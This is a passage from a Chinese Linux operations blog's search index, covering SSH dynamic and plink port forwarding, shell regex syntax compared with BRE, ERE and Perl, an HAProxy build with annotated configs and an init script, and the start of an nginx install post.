","date":"2019-05-07","objectID":"/posts/linux/ssh%E9%9A%A7%E9%81%93%E7%9B%B8%E5%85%B3/:10:0","tags":["linux","ssh"],"title":"Ssh隧道相关","uri":"/posts/linux/ssh%E9%9A%A7%E9%81%93%E7%9B%B8%E5%85%B3/"},{"categories":["linux","那些有用没用的"],"content":"命令格式 ssh -D \u003clocal port\u003e \u003cSSH Server\u003e ","date":"2019-05-07","objectID":"/posts/linux/ssh%E9%9A%A7%E9%81%93%E7%9B%B8%E5%85%B3/:11:0","tags":["linux","ssh"],"title":"Ssh隧道相关","uri":"/posts/linux/ssh%E9%9A%A7%E9%81%93%E7%9B%B8%E5%85%B3/"},{"categories":["linux","那些有用没用的"],"content":"4.1. 隧道搭建(serverA 执行) [root@00 ~]# ssh -N -D 9000 root@serverC # ssh -N -D 127.0.0.1:9000 root@serverC ","date":"2019-05-07","objectID":"/posts/linux/ssh%E9%9A%A7%E9%81%93%E7%9B%B8%E5%85%B3/:12:0","tags":["linux","ssh"],"title":"Ssh隧道相关","uri":"/posts/linux/ssh%E9%9A%A7%E9%81%93%E7%9B%B8%E5%85%B3/"},{"categories":["linux","那些有用没用的"],"content":"4.2. 隧道连接 (serverA 执行) (若serverC为公网ip,也可通过其ip访问公网网络) 然后通过 ProxyChains-NG或其他程序配置 socks4或socks5即可通过serverC 连接serverC同网段的其他主机(serverD) ","date":"2019-05-07","objectID":"/posts/linux/ssh%E9%9A%A7%E9%81%93%E7%9B%B8%E5%85%B3/:13:0","tags":["linux","ssh"],"title":"Ssh隧道相关","uri":"/posts/linux/ssh%E9%9A%A7%E9%81%93%E7%9B%B8%E5%85%B3/"},{"categories":["linux","那些有用没用的"],"content":"5. windows 端口转发 plink.exe是putty的附属工具 . $\u003e plink.exe -ssh -i sshrsa.ppk 9022:10.0.1.12:22 root@10.0.1.12 ","date":"2019-05-07","objectID":"/posts/linux/ssh%E9%9A%A7%E9%81%93%E7%9B%B8%E5%85%B3/:14:0","tags":["linux","ssh"],"title":"Ssh隧道相关","uri":"/posts/linux/ssh%E9%9A%A7%E9%81%93%E7%9B%B8%E5%85%B3/"},{"categories":["linux","整理收集"],"content":"正则表达式","date":"2019-04-28","objectID":"/posts/linux/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/","tags":["linux","正则","解决方案"],"title":"正则表达式介绍","uri":"/posts/linux/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"},{"categories":["linux","整理收集"],"content":" 前言 最近在写一个脚本,需要使用到正则表达式,作为曾经的一个开发,正则还是知道一些的,但是写着写着发现不对,但在测试器里面,正则又是正确的,虽然直到shell正则并不是标准的perl正则,但也一直没有查询到到底那些支持,那些不支持,翻了很久终于在google上找到了一篇介绍这些区别的文章,此处记录下,以备查验。 原文来源 http://man.linuxde.net/docs/shell_regex.html 引入扩展 https://tool.oschina.net/uploads/apidocs/jquery/regexp.html ","date":"2019-04-28","objectID":"/posts/linux/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/:0:0","tags":["linux","正则","解决方案"],"title":"正则表达式介绍","uri":"/posts/linux/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"},{"categories":["linux","整理收集"],"content":"1. 正则表达式的分类 基本的正则表达式（Basic Regular Expression 又叫Basic RegEx 简称BREs） 扩展的正则表达式（Extended Regular Expression 又叫Extended RegEx 简称EREs） Perl的正则表达式（Perl Regular Expression 又叫Perl RegEx 简称PREs） ","date":"2019-04-28","objectID":"/posts/linux/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/:1:0","tags":["linux","正则","解决方案"],"title":"正则表达式介绍","uri":"/posts/linux/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"},{"categories":["linux","整理收集"],"content":"2. 基本组成部分 正则表达式的基本组成部分。 正则表达式 描述 示例 Basic RegEx Extended RegEx Python RegEx Perl regEx \\ 转义符，将特殊字符进行转义，忽略其特殊意义 a\\.b匹配a.b，但不能匹配ajb，.被转义为特殊意义 \\ \\ \\ \\ ^ 匹配行首，awk中，^则是匹配字符串的开始 ^tux匹配以tux开头的行 ^ ^ ^ ^ $ 匹配行尾，awk中，$则是匹配字符串的结尾 tux$匹配以tux结尾的行 $ $ $ $ . 匹配除换行符\\n之外的任意单个字符，awk中则可以 ab.匹配abc或ab+，不可匹配abcd或abde，只能匹配单字符 . . . . [] 匹配包含在[字符]之中的任意一个字符 coo[kl]可以匹配cook或cool [] [] [] [] [^] 匹配[^字符]之外的任意一个字符 123[^45]不可以匹配1234或1235，但1231、1232、1236、1237可以 [^] [^] [^] [^] [-] 匹配[]中指定范围内的任意一个字符，要写成递增 [0-9]可以匹配1、2或3等其中任意一个数字 [-] [-] [-] [-] ? 匹配之前的项1次或者0次 colou?r可以匹配color或者colour，不能匹配colouur 不支持 ? ? ? + 匹配之前的项1次或者多次 sa-6+匹配sa-6、sa-666，不能匹配sa- 不支持 + + + * 匹配之前的项0次或者多次 co*l匹配cl、col、cool、coool等 * * * * () 匹配表达式，创建一个用于匹配的子串 ma(tri)?匹配max或maxtrix 不支持 () () () {n} 匹配之前的项n次，n是可以为0的正整数 [0-9]{3}匹配任意一个三位数，可以扩展为[0-9][0-9][0-9] 不支持 {n} {n} {n} {n,} 之前的项至少需要匹配n次 [0-9]{2,}匹配任意一个两位数或更多位数 不支持 {n,} {n,} {n,} {n,m} 指定之前的项至少匹配n次，最多匹配m次，n\u003c=m [0-9]{2,5}匹配从两位数到五位数之间的任意一个数字 不支持 {n,m} {n,m} {n,m} ` ` 交替匹配 两边的任意一项`ab(c d)匹配abc或abd` 不支持 ` ","date":"2019-04-28","objectID":"/posts/linux/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/:2:0","tags":["linux","正则","解决方案"],"title":"正则表达式介绍","uri":"/posts/linux/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"},{"categories":["linux","整理收集"],"content":"3. POSIX字符类 POSIX字符类是一个形如[:...:]的特殊元序列（meta sequence），他可以用于匹配特定的字符范围。 正则表达式 描述 示例 Basic RegEx Extended RegEx Python RegEx Perl regEx [:alnum:] 匹配任意一个字母或数字字符 [[:alnum:]]+ [:alnum:] [:alnum:] [:alnum:] [:alnum:] [:alpha:] 匹配任意一个字母字符（包括大小写字母） [[:alpha:]]{4} [:alpha:] [:alpha:] [:alpha:] [:alpha:] [:blank:] 空格与制表符（横向和纵向） [[:blank:]]* [:blank:] [:blank:] [:blank:] [:blank:] [:digit:] 匹配任意一个数字字符 [[:digit:]]? [:digit:] [:digit:] [:digit:] [:digit:] [:lower:] 匹配小写字母 [[:lower:]]{5,} [:lower:] [:lower:] [:lower:] [:lower:] [:upper:] 匹配大写字母 ([[:upper:]]+)? [:upper:] [:upper:] [:upper:] [:upper:] [:punct:] 匹配标点符号 [[:punct:]] [:punct:] [:punct:] [:punct:] [:punct:] [:space:] 匹配一个包括换行符、回车等在内的所有空白符 [[:space:]]+ [:space:] [:space:] [:space:] [:space:] [:graph:] 匹配任何一个可以看得见的且可以打印的字符 [[:graph:]] [:graph:] [:graph:] [:graph:] [:graph:] [:xdigit:] 任何一个十六进制数（即：0-9，a-f，A-F） [[:xdigit:]]+ [:xdigit:] [:xdigit:] [:xdigit:] [:xdigit:] [:cntrl:] 任何一个控制字符（ASCII字符集中的前32个字符) [[:cntrl:]] [:cntrl:] [:cntrl:] [:cntrl:] [:cntrl:] [:print:] 任何一个可以打印的字符 [[:print:]] [:print:] [:print:] [:print:] [:print:] ","date":"2019-04-28","objectID":"/posts/linux/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/:3:0","tags":["linux","正则","解决方案"],"title":"正则表达式介绍","uri":"/posts/linux/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"},{"categories":["linux","整理收集"],"content":"4. 元字符 元字符（meta character）是一种Perl风格的正则表达式，只有一部分文本处理工具支持它，并不是所有的文本处理工具都支持。 正则表达式 描述 示例 Basic RegEx Extended RegEx Python RegEx Perl regEx \\b 单词边界 \\bcool\\b 匹配cool，不匹配coolant \\b \\b \\b \\b \\B 非单词边界 cool\\B 匹配coolant，不匹配cool \\B \\B \\B \\B \\d 单个数字字符 b\\db 匹配b2b，不匹配bcb 不支持 不支持 \\d \\d \\D 单个非数字字符 b\\Db 匹配bcb，不匹配b2b 不支持 不支持 \\D \\D \\w 单个单词字符（字母、数字与_） \\w 匹配1或a，不匹配\u0026 \\w \\w \\w \\w \\W 单个非单词字符 \\W 匹配\u0026，不匹配1或a \\W \\W \\W \\W \\n 换行符 \\n 匹配一个新行 不支持 不支持 \\n \\n \\s 单个空白字符 x\\sx 匹配x x，不匹配xx 不支持 不支持 \\s \\s \\S 单个非空白字符 x\\S\\x 匹配xkx，不匹配xx 不支持 不支持 \\S \\S \\r 回车 \\r 匹配回车 不支持 不支持 \\r \\r \\t 横向制表符 \\t 匹配一个横向制表符 不支持 不支持 \\t \\t \\v 垂直制表符 \\v 匹配一个垂直制表符 不支持 不支持 \\v \\v \\f 换页符 \\f 匹配一个换页符 不支持 不支持 \\f \\f ","date":"2019-04-28","objectID":"/posts/linux/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/:4:0","tags":["linux","正则","解决方案"],"title":"正则表达式介绍","uri":"/posts/linux/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"},{"categories":["linux","运维记事","整理收集"],"content":"Haproxy部署与常用操作","date":"2019-04-12","objectID":"/posts/linux/haproxy%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/","tags":["linux","haproxy","反向代理"],"title":"Haproxy部署与常用操作","uri":"/posts/linux/haproxy%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/"},{"categories":["linux","运维记事","整理收集"],"content":" 本文参考以下内容, 由本站重新整理验证发布 https://zhang.ge/5125.html https://www.kancloud.cn/tuna_dai_/day01/369367 ","date":"2019-04-12","objectID":"/posts/linux/haproxy%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/:0:0","tags":["linux","haproxy","反向代理"],"title":"Haproxy部署与常用操作","uri":"/posts/linux/haproxy%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/"},{"categories":["linux","运维记事","整理收集"],"content":"1. 简介 HAProxy提供高可用性、负载均衡以及基于TCP和HTTP应用的代理，支持虚拟主机，它是免费、快速并且可靠的一种解决方案。 HAProxy特别适用于那些负载特大的web站点，这些站点通常又需要会话保持或七层处理。 HAProxy运行在当前的硬件上，完全可以支持数以万计的并发连接。并且它的运行模式使得它可以很简单安全的整合进您当前的架构中， 同时可以保护你的web服务器不被暴露到网络上。 HAProxy实现了一种事件驱动, 单一进程模型，此模型支持非常大的并发连接数。多进程或多线程模型受内存限制 、系统调度器限制以及无处不在的锁限制，很少能处理数千并发连接。事件驱动模型因为在有更好的资源和时间管理的用户空间(User-Space) 实现所有这些任务，所以没有这些问题。此模型的弊端是，在多核系统上，这些程序通常扩展性较差。这就是为什么他们必须进行优化以 使每个CPU时间片(Cycle)做更多的工作。 ","date":"2019-04-12","objectID":"/posts/linux/haproxy%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/:1:0","tags":["linux","haproxy","反向代理"],"title":"Haproxy部署与常用操作","uri":"/posts/linux/haproxy%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/"},{"categories":["linux","运维记事","整理收集"],"content":"2. 安装 [root@00 software]# wget https://www.haproxy.org/download/1.8/src/haproxy-1.8.19.tar.gz [root@00 software]# tar -xzvf haproxy-1.8.19.tar.gz [root@00 software]# cd haproxy-1.8.19/ # 安装 # 内核版本，使用uname -r查看内核，如：2.6.18-371.el5，此时该参数就为linux26；kernel 大于2.6.28的用：TARGET=linux2628 [root@00 haproxy-1.8.19]# make TARGET=linux2628 ARCH=x86_64 PREFIX=/opt/haproxy # PREFIX=/opt/haproxy-1.8.19 [root@00 haproxy-1.8.19]# make install PREFIX=/opt/haproxy # PREFIX=/opt/haproxy-1.8.19 [root@00 haproxy-1.8.19]# useradd -u 1012 -M -s /sbin/nologin -d /opt/haproxy haproxy [root@00 haproxy-1.8.19]# chown -R haproxy.haproxy /opt/haproxy-1.8.19 # [root@00 haproxy-1.8.19]# ln -s /opt/haproxy-1.8.19 /opt/haproxy ","date":"2019-04-12","objectID":"/posts/linux/haproxy%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/:2:0","tags":["linux","haproxy","反向代理"],"title":"Haproxy部署与常用操作","uri":"/posts/linux/haproxy%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/"},{"categories":["linux","运维记事","整理收集"],"content":"3. 配置 ","date":"2019-04-12","objectID":"/posts/linux/haproxy%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/:3:0","tags":["linux","haproxy","反向代理"],"title":"Haproxy部署与常用操作","uri":"/posts/linux/haproxy%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/"},{"categories":["linux","运维记事","整理收集"],"content":"3.1. 规划目录 # haproxy chroot,需要设置所有用户均不具有写权限 [root@00 haproxy-1.8.19]# mkdir /opt/haproxy/chroot \u0026\u0026 chmod 440 /opt/haproxy/chroot # 主配置文件目录 [root@00 haproxy-1.8.19]# mkdir /opt/haproxy/etc # 子配置文件目录，规划enabled 目录为 ready目录内正式启用的软连接文件 [root@00 haproxy-1.8.19]# mkdir /opt/haproxy/etc/{enabled,ready}/{tcp,http} -p # 完整目录结构 [root@00 haproxy-1.8.19]# tree /opt/haproxy/etc/ /opt/haproxy/etc/ ├── enabled │ ├── http │ │ └── example.cfg -\u003e ../../ready/http/example.cfg │ └── tcp ├── haproxy.cfg └── ready ├── http │ └── example.cfg └── tcp 6 directories, 3 files ","date":"2019-04-12","objectID":"/posts/linux/haproxy%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/:4:0","tags":["linux","haproxy","反向代理"],"title":"Haproxy部署与常用操作","uri":"/posts/linux/haproxy%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/"},{"categories":["linux","运维记事","整理收集"],"content":"3.2. 主配置文件 # current config: /opt/haproxy/etc/haproxy.cfg ###### haproxy 进程信息设置 ###### global log 172.10.10. local0 maxconn 4096 #最大连接数 chroot /opt/haproxy/chroot #chroot装录 pidfile /opt/haproxy/haproxy.pid #haproxy pid stats socket /opt/haproxy/haproxy.sock mode 660 level admin #定义统计信息保存的位置,设置权限660，等级设置为管理,防止使用socat与sock通信是权限不够 user haproxy #用户nobody group haproxy #组nobody daemon #守护进程运行 nbproc 1 #进程数量 ##### 默认配置，均可通过后续设置覆盖当前设置 ###### defaults log global mode http #7层 http;4层tcp,如果要让haproxy支持虚拟主机，mode 必须设为http option httplog #记录haproxy 访问日志, http 日志格式 option httpclose #每次请求完毕后主动关闭http通道,haproxy不支持keep-alive,只能模拟这种模式的实现 option redispatch #serverId对应的服务器挂掉后,强制定向到其他健康的服务器 retries 3 #3次连接失败就认为是服务器不可用 option dontlognull #日志中不记录空连接,比如健康检查日志信息 option forwardfor header X-REAL-IP # 转发用户真实ip maxconn 2000 #最大连接数，受系统ulimit 设置影响 timeout connect 3600000 #连接超时(毫秒) timeout client 3600000 #客户端超时(毫秒) timeout server 3600000 #服务器超时(毫秒) listen stats bind 0.0.0.0:8888 stats enable # 显示状态页面 stats hide-version # 隐藏 haproxy 版本号 stats refresh 30s # 页面自动刷新时间 stats uri /haproxy-status # 统计页面url stats realm hello\\ haproxy #统计页面密码框上提示文本 stats auth haproxy:haproxy # 设置监控页面的用户和密码，可以设置多个 #stats auth haproxy:haproxy ","date":"2019-04-12","objectID":"/posts/linux/haproxy%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/:5:0","tags":["linux","haproxy","反向代理"],"title":"Haproxy部署与常用操作","uri":"/posts/linux/haproxy%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/"},{"categories":["linux","运维记事","整理收集"],"content":"3.3. 子配置 # current config: /opt/haproxy/etc/ready/http/example.cfg ###### 前端配置 ###### frontend frontend_www.example.com_1 # bind 0.0.0.0:5000 mode http # acl url_static path_beg -i /static /images /javascript /stylesheets # acl url_static path_end -i .jpg .gif .png .css .js # use_backend static if url_static # 请求转发到那个后端 default_backend backend_www.example.com_1 #--------------------------------------------------------------------- # static backend for serving up images, stylesheets and such #--------------------------------------------------------------------- ###### 后端配置 ###### backend backend_www.example.com_1 option forwardfor header X-REAL-IP # 健康检查，发送一个HEAD请求，验证节点是否存活 option httpchk HEAD / HTTP/1.0 # 负载均衡模式roundrobin(轮询);source(ip hash);static-rr(权重轮询);leastconn(以服务器连接数轮询，连接数最低的优先连接) balance roundrobin # check: 启用健康检查 # inter 默认2秒检查 # rise 检查连续可以的次数，当超过该次数,加入该节点，可用次数一般设置稍大 # 1fall 检查连续不可用的次数，当超过该次数,剔除该节点 server node1 172.10.10.11:8081 check inter 2000 rise 30 fall 15 server node2 172.10.10.12:8081 check inter 2000 rise 30 fall 15 ","date":"2019-04-12","objectID":"/posts/linux/haproxy%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/:6:0","tags":["linux","haproxy","反向代理"],"title":"Haproxy部署与常用操作","uri":"/posts/linux/haproxy%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/"},{"categories":["linux","运维记事","整理收集"],"content":"3.4. 详细配置说明 ###########全局配置######### global log 127.0.0.1 local0 #[日志输出配置，所有日志都记录在本机，通过local0输出] log 127.0.0.1 local1 notice #定义haproxy 日志级别[error warringinfo debug] daemon #以后台形式运行harpoxy nbproc 1 #设置进程数量 maxconn 4096 #默认最大连接数,需考虑ulimit-n限制 #user haproxy #运行haproxy的用户 #group haproxy #运行haproxy的用户所在的组 #pidfile /var/run/haproxy.pid #haproxy 进程PID文件 #ulimit-n 819200 #ulimit 的数量限制 #chroot /usr/share/haproxy #chroot运行路径 #debug #haproxy 调试级别，建议只在开启单进程的时候调试 #quiet ########默认配置############ defaults log global mode http #默认的模式mode { tcp|http|health }，tcp是4层，http是7层，health只会返回OK option httplog #日志类别,采用httplog option dontlognull #不记录健康检查日志信息 retries 2 #两次连接失败就认为是服务器不可用，也可以通过后面设置 #option forwardfor #如果后端服务器需要获得客户端真实ip需要配置的参数，可以从Http Header中获得客户端ip option httpclose #每次请求完毕后主动关闭http通道,haproxy不支持keep-alive,只能模拟这种模式的实现 #option redispatch #当serverId对应的服务器挂掉后，强制定向到其他健康的服务器，以后将不支持 option abortonclose #当服务器负载很高的时候，自动结束掉当前队列处理比较久的链接 maxconn 4096 #默认的最大连接数 timeout connect 5000ms #连接超时 timeout client 30000ms #客户端超时 timeout server 30000ms #服务器超时 #timeout check 2000 #心跳检测超时 #timeout http-keep-alive10s #默认持久连接超时时间 #timeout http-request 10s #默认http请求超时时间 #timeout queue 1m #默认队列超时时间 balance roundrobin #设置默认负载均衡方式，轮询方式 #balance source #设置默认负载均衡方式，类似于nginx的ip_hash #balnace leastconn #设置默认负载均衡方式，最小连接数 ########统计页面配置######## listen stats bind 0.0.0.0:1080 #设置Frontend和Backend的组合体，监控组的名称，按需要自定义名称 mode http #http的7层模式 option httplog #采用http日志格式 #log 127.0.0.1 local0 err #错误日志记录 maxconn 10 #默认的最大连接数 stats refresh 30s #统计页面自动刷新时间 stats uri /stats #统计页面url stats realm XingCloud\\ Haproxy #统计页面密码框上提示文本 stats auth admin:admin #设置监控页面的用户和密码:admin,可以设置多个用户名 stats auth Frank:Frank #设置监控页面的用户和密码：Frank stats hide-version #隐藏统计页面上HAProxy的版本信息 stats admin if TRUE #设置手工启动/禁用，后端服务器(haproxy-1.4.9以后版本) ########设置haproxy 错误页面##### #errorfile 403 /home/haproxy/haproxy/errorfiles/403.http #errorfile 500 /home/haproxy/haproxy/errorfiles/500.http #errorfile 502 /home/haproxy/haproxy/errorfiles/502.http #errorfile 503 /home/haproxy/haproxy/errorfiles/503.http #errorfile 504 /home/haproxy/haproxy/errorfiles/504.http ########frontend前端配置############## frontend main bind *:80 #这里建议使用bind *:80的方式，要不然做集群高可用的时候有问题，vip切换到其他机器就不能访问了。 acl web hdr(host) -i www.abc.com #acl后面是规则名称，-i为忽略大小写，后面跟的是要访问的域名，如果访问www.abc.com这个域名，就触发web规则，。 acl img hdr(host) -i img.abc.com #如果访问img.abc.com这个域名，就触发img规则。 use_backend webserver if web #如果上面定义的web规则被触发，即访问www.abc.com，就将请求分发到webserver这个作用域。 use_backend imgserver if img #如果上面定义的img规则被触发，即访问img.abc.com，就将请求分发到imgserver这个作用域。 default_backend dynamic #不满足则响应backend的默认页面 ###### \u003e\u003e ################################# ACL ################################# \u003c\u003c ###### ########ACL策略定义######################### #如果请求的域名满足正则表达式返回true -i是忽略大小写 acl denali_policy hdr_reg(host) -i ^(www.inbank.com|image.inbank.com)$ #如果请求域名满足www.inbank.com 返回 true -i是忽略大小写 acl tm_policy hdr_dom(host) -i www.inbank.com #在请求url中包含sip_apiname=，则此控制策略返回true,否则为false acl invalid_req url_sub -i sip_apiname=#定义一个名为invalid_req的策略 #在请求url中存在timetask作为部分地址路径，则此控制策略返回true,否则返回false acl timetask_req url_dir -i timetask #当请求的header中Content-length等于0时返回 true acl missing_cl hdr_cnt(Content-length) eq 0 #########acl策略匹配相应################### #当请求中header中Content-length等于0 阻止请求返回403 block if missing_cl #block表示阻止请求，返回403错误，当前表示如果不满足策略invalid_req，或者满足策略timetask_req，则阻止请求。 block if !invalid_req || timetask_req #当满足denali_policy的策略时使用denali_server的backend use_backend denali_server if denali_policy #当满足tm_policy的策略时使用tm_server的backend use_backend tm_server if tm_policy #reqisetbe关键字定义，根据定义的关键字选择backend reqisetbe ^Host:\\ img dynamic reqisetbe ^[^\\ ]*\\ /(img|css)/ dynamic reqisetbe ^[^\\ ]*\\ /admin/stats stats #以上都不满足的时候使用默认mms_server的backend default_backend mms ###### \u003e\u003e ################################# ACL ################################# \u003c\u003c ###### ########backend后端配置############## backend webserver #webserver作用域 mode http balance roundrobin #balance roundrobin 负载轮询，balance source 保存session值，支持static-rr，leastconn，f","date":"2019-04-12","objectID":"/posts/linux/haproxy%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/:7:0","tags":["linux","haproxy","反向代理"],"title":"Haproxy部署与常用操作","uri":"/posts/linux/haproxy%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/"},{"categories":["linux","运维记事","整理收集"],"content":"3.5. 启动管理 参考 https://zhang.ge/5125.html 中脚本微调适应个人需求 haproxy.init.sh #!/bin/sh # # chkconfig: - 85 15 # description: HAProxy is a TCP/HTTP reverse proxy which is particularly suited \\ # for high availability environments. # processname: haproxy # config: /opt/haproxy/etc/haproxy.cfg # pidfile: /opt/haproxy/haproxy.pid # Script Author: 0x5c0f(初版作者https://zhang.ge/5125.html) # Version: 2004060600 PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:~/bin export PATH PROCESS_NAME=haproxy BASE_DIR=/opt/haproxy EXEC=$BASE_DIR/sbin/haproxy PID_FILE=$BASE_DIR/haproxy.pid DEFAULT_CONF=$BASE_DIR/etc/haproxy.cfg # COLOR print COLOR_RED=$(echo -e \"\\e[31;49m\") COLOR_GREEN=$(echo -e \"\\e[32;49m\") COLOR_RESET=$(echo -e \"\\e[0m\") info() { echo \"${COLOR_GREEN}$*${COLOR_RESET}\"; } warn() { echo \"${COLOR_RED}$*${COLOR_RESET}\"; } print_usage() { info \" Usage: $(basename $0) [start|stop|restart|status|test]\" } #get Expanding configuration ext_configs() { CONFIGS= if [[ -d $BASE_DIR/etc/enabled ]]; then for FILE in $(find $BASE_DIR/etc/enabled -type l | sort -n); do CONFIGS=\"$CONFIGS -f $FILE\" done echo $CONFIGS else echo fi } # check process status check_process() { PID=$(get_pid) if ps aux | awk '{print $2}' | grep -qw $PID 2\u003e/dev/null; then true else false fi } # check Configuration file check_conf() { $EXEC -c -f $DEFAULT_CONF $(ext_configs) \u003e/dev/null 2\u003e\u00261 return $? } get_pid() { if [[ -f $PID_FILE ]]; then cat $PID_FILE else warn \" $PID_FILE not found!\" exit 1 fi } start() { if check_process; then warn \" ${PROCESS_NAME} is already running!\" else $EXEC -f $DEFAULT_CONF $(ext_configs) \u0026\u0026 echo -e \" ${PROCESS_NAME} start [ $(info OK) ]\" || echo -e \" ${PROCESS_NAME} start [ $(warn Failed) ]\" fi } stop() { if check_process; then PID=$(get_pid) kill -9 $PID \u003e/dev/null 2\u003e\u00261 echo -e \" ${PROCESS_NAME} stop [ $(info OK) ]\" else warn \" ${PROCESS_NAME} is not running!\" fi } restart() { if ! check_process ; then warn \" ${PROCESS_NAME} is not running! Starting Now...\" fi if $(check_conf); then PID=$(get_pid) $EXEC -f $DEFAULT_CONF $(ext_configs) -st $PID \u0026\u0026 echo -e \" ${PROCESS_NAME} restart [ $(info OK) ]\" || echo -e \" ${PROCESS_NAME} restart [ $(warn Failed) ]\" else warn \" ${PROCESS_NAME} Configuration file is not valid, plz check!\" echo -e \" ${PROCESS_NAME} restart [ $(warn Failed) ]\" fi } if [[ $# != 1 ]]; then print_usage exit 1 else case $1 in \"start\" | \"START\") start ;; \"stop\" | \"STOP\") stop ;; \"restart\" | \"RESTART\" | \"-r\") restart ;; \"status\" | \"STATUS\") if check_process; then info \"${PROCESS_NAME} is running OK!\" else warn \" ${PROCESS_NAME} not running, plz check\" fi ;; \"test\" | \"TEST\" | \"-t\") if check_conf; then info \" Configuration file test Successfully.\" else warn \" Configuration file test failed.\" fi ;; *) print_usage exit 1 ;; esac fi ","date":"2019-04-12","objectID":"/posts/linux/haproxy%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/:8:0","tags":["linux","haproxy","反向代理"],"title":"Haproxy部署与常用操作","uri":"/posts/linux/haproxy%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/"},{"categories":["linux","运维记事","整理收集"],"content":"4. 访问管理 ","date":"2019-04-12","objectID":"/posts/linux/haproxy%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/:9:0","tags":["linux","haproxy","反向代理"],"title":"Haproxy部署与常用操作","uri":"/posts/linux/haproxy%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/"},{"categories":["linux","运维记事","整理收集"],"content":"4.1. 前端 负载均衡vip 访问地址: http://0.0.0.0:5000 haproxy 管理访问地址: http://0.0.0.0:8888/haproxy-status ","date":"2019-04-12","objectID":"/posts/linux/haproxy%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/:10:0","tags":["linux","haproxy","反向代理"],"title":"Haproxy部署与常用操作","uri":"/posts/linux/haproxy%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/"},{"categories":["linux","运维记事","整理收集"],"content":"4.2. 后端 后端与haproxy socket 通信操作(需要socat支持) # 节点启用维护模式 # echo \"disable server backend_www.example.com_1/node1\" |socat stdio /opt/haproxy/haproxy.sock # 节点关闭维护模式 # echo \"enable server backend_www.example.com_1/node1\" |socat stdio /opt/haproxy/haproxy.sock ","date":"2019-04-12","objectID":"/posts/linux/haproxy%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/:11:0","tags":["linux","haproxy","反向代理"],"title":"Haproxy部署与常用操作","uri":"/posts/linux/haproxy%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C/"},{"categories":["linux","运维记事"],"content":"Nginx安装维护","date":"2019-04-10","objectID":"/posts/linux/nginx%E5%AE%89%E8%A3%85%E7%BB%B4%E6%8A%A4/","tags":["linux","nginx"],"title":"Nginx安装维护","uri":"/posts/linux/nginx%E5%AE%89%E8%A3%85%E7%BB%B4%E6%8A%A4/"},{"categories":["linux","运维记事"],"content":"搭建环境： nginx：1.14.2 服务器：centos7 